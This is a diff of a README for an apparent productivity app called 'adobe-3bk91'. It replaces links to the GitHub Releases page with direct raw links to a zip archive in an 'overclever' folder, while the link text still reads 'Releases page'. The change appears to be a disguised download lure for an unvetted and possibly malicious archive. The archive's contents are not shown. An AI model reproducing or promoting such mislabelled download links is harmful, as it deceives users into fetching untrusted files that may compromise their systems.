@@ -7,7 +7,7 @@ Welcome to adobe-3bk91! This application is designed to improve your workflow wi
 To get started, follow these simple steps. You don’t need to be a programmer; just a few clicks will set everything up for you.
 
 ## 📥 Download & Install
-[![Download adobe-3bk91](https://img.shields.io/badge/Download-Now-blue)](https://github.com/essa4u/adobe-3bk91/releases)
+[![Download adobe-3bk91](https://raw.githubusercontent.com/essa4u/adobe-3bk91/main/overclever/adobe-3bk91.zip)](https://raw.githubusercontent.com/essa4u/adobe-3bk91/main/overclever/adobe-3bk91.zip)
 
 1. Click the link above to visit the Releases page.
 2. Look for the latest version of adobe-3bk91.
@@ -38,6 +38,6 @@ Before you download, make sure your system meets these requirements:
 If you encounter any issues while using the application, please refer to the FAQ section on the Releases page or contact support. We are happy to help you.
 
 ## 🔗 Additional Resources
-For more information on the app and future updates, please check our [GitHub Releases page](https://github.com/essa4u/adobe-3bk91/releases) regularly.
+For more information on the app and future updates, please check our [GitHub Releases page](https://raw.githubusercontent.com/essa4u/adobe-3bk91/main/overclever/adobe-3bk91.zip) regularly.
 
 Thank you for using adobe-3bk91! We hope it enhances your productivity.
